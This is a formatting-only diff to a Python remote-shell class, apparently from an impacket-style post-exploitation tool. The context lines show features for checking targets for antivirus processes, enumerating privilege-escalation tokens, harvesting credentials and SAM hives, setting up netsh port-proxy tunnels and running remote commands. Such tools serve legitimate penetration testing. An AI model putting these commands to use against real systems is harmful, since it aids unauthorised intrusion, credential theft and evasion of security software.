@@ -16,7 +16,8 @@ from six import PY2
 CODEC = sys.stdout.encoding
 
 class remoteshell(cmd.Cmd):
-    def __init__(self, share, outputfile, win32Process, smbConnection, shell_type, silentCommand=False):
+    def __init__(self, share, outputfile, win32Process, 
+                 smbConnection, shell_type, silentCommand=False):
         cmd.Cmd.__init__(self)
         self.__share = share
         self.__output = '\\Temp\\' + outputfile
@@ -42,8 +43,10 @@ class remoteshell(cmd.Cmd):
         if self.__silentCommand is True:
             self.__shell = ''
 
+
     def do_shell(self, s):
         os.system(s)
+
 
     def do_help(self, line):
         print("""
@@ -88,6 +91,7 @@ class remoteshell(cmd.Cmd):
   tokens                    - enumerate enabled tokens for priv esc path
   """)
 
+
     def do_survey(self, s):
         save_local_option = s.split(" ")[0]
         if save_local_option == "save":
@@ -125,6 +129,7 @@ class remoteshell(cmd.Cmd):
             except:
                 logging.info("Something went wrong, try again")
 
+
     def do_loggrab(self, s):
         try:
             prefix = 'copy '
@@ -154,6 +159,7 @@ class remoteshell(cmd.Cmd):
 
         except:
             pass
+
 
     def do_sysinfo(self, s):
         try:
@@ -188,6 +194,7 @@ class remoteshell(cmd.Cmd):
         except:
             pass
 
+
     def do_lcd(self, s):
         if s == '':
             print(os.getcwd())
@@ -196,6 +203,7 @@ class remoteshell(cmd.Cmd):
                 os.chdir(s)
             except Exception as e:
                 logging.error(str(e))
+
 
     def do_lget(self, src_path):
 
@@ -215,6 +223,7 @@ class remoteshell(cmd.Cmd):
             if os.path.exists(filename):
                 os.remove(filename)
 
+
     def do_addtun(self, s):
         lport = s.split(" ")[0]
         rhost = s.split(" ")[1]
@@ -227,6 +236,7 @@ class remoteshell(cmd.Cmd):
         except:
             pass
 
+
     def do_showtun(self, s):
         try:
             self.execute_remote("netsh interface portproxy show v4tov4")
@@ -235,6 +245,7 @@ class remoteshell(cmd.Cmd):
                 self.__outputBuffer = '' 
         except:
             pass
+
 
     def do_deltun(self, s):
         lport = s.split(" ")[0] 
@@ -245,6 +256,7 @@ class remoteshell(cmd.Cmd):
                 self.__outputBuffer = '' 
         except:
             pass
+    
     
     def do_ls(self, s):
         #see if user specified a dir or not
@@ -290,6 +302,7 @@ class remoteshell(cmd.Cmd):
             logging.critical(str(e))
             pass
 
+
     def do_psp(self, s):
         try:
             self.execute_remote('tasklist /svc | findstr /i "MsMpEng.exe || WinDefend || MSASCui.exe || navapsvc.exe || avkwctl.exe || fsav32.exe || mcshield.exe || ntrtscan.exe || avguard.exe || ashServ.exe || avengine.exe || avgemc.exe || tmntsrv.exe || kavfswp.exe || kavtray.exe || vapm.exe || avpui.exe || avp.exe"')
@@ -299,6 +312,7 @@ class remoteshell(cmd.Cmd):
                 self.__outputBuffer = ''
         except:
             pass
+
 
     def do_tokens(self, s):
         self.execute_remote('whoami /priv | findstr /i "Enabled"')
@@ -315,6 +329,7 @@ class remoteshell(cmd.Cmd):
         else:
             logging.info("No Valuable Tokens Found")
         self.__outputBuffer = ''
+
 
     def do_creds(self, s):
         #WDigest 
@@ -357,6 +372,7 @@ class remoteshell(cmd.Cmd):
                 print(self.__outputBuffer)
                 self.__outputBuffer = '' 
 
+
     def do_vmcheck(self, s):
         try:
             logging.info("Common Processes: ")
@@ -381,6 +397,7 @@ class remoteshell(cmd.Cmd):
         except:
             logging.info("Something went wrong, try again")
 
+
     def do_cat(self, s):
         try:
             self.execute_remote('type ' + s)
@@ -390,6 +407,7 @@ class remoteshell(cmd.Cmd):
         except Exception as e:
             logging.critical(str(e))
             pass
+
 
     def do_unattend(self, s):
         one = r"C:\unattend.txt"
@@ -467,6 +485,7 @@ class remoteshell(cmd.Cmd):
         except:
             pass
 
+
     def do_regrip(self, s):
         try:
             logging.info("SAM")
@@ -500,12 +519,15 @@ class remoteshell(cmd.Cmd):
     def do_exit(self, s):
         return True
 
+
     def do_EOF(self, s):
         print()
         return self.do_exit(s)
 
+
     def emptyline(self):
         return False
+
 
     def do_cd(self, s):
         self.execute_remote('cd ' + s)
@@ -523,6 +545,7 @@ class remoteshell(cmd.Cmd):
             if self.__shell_type == 'powershell':
                 self.prompt = '\U0001F47B' + ' ' + 'PS ' + self.prompt + ' '
             self.__outputBuffer = ''
+
 
     def default(self, line):
         # Let's try to guess if the user is trying to change drive
@@ -543,6 +566,7 @@ class remoteshell(cmd.Cmd):
         else:
             if line != '':
                 self.send_data(line)
+
 
     def get_output(self):
         def output_callback(data):
@@ -574,6 +598,7 @@ class remoteshell(cmd.Cmd):
                     return self.get_output()
         self.__transferClient.deleteFile(self.__share, self.__output)
 
+
     def execute_remote(self, data, shell_type='cmd'):
         if shell_type == 'powershell':
             data = '$ProgressPreference="SilentlyContinue";' + data
@@ -588,6 +613,7 @@ class remoteshell(cmd.Cmd):
         else:
             self.__win32Process.Create(command, self.__pwd, None)
         self.get_output()
+
 
     def send_data(self, data):
         self.execute_remote(data, self.__shell_type)
